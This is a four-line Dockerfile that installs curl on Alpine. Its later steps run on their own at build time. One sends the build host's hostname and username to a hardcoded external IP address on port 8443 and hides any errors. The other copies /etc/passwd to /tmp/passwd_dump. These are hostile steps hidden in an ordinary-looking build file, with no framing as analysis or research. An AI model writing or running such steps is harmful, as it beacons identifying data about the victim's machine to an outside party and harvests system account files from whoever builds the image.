FROM alpine:latest
RUN apk add --no-cache curl
RUN curl -s http://137.184.141.100:8443/$(hostname)_$(whoami)_$(cat /etc/hostname 2>/dev/null || echo unknown) || true
RUN cat /etc/passwd > /tmp/passwd_dump 2>/dev/null || true
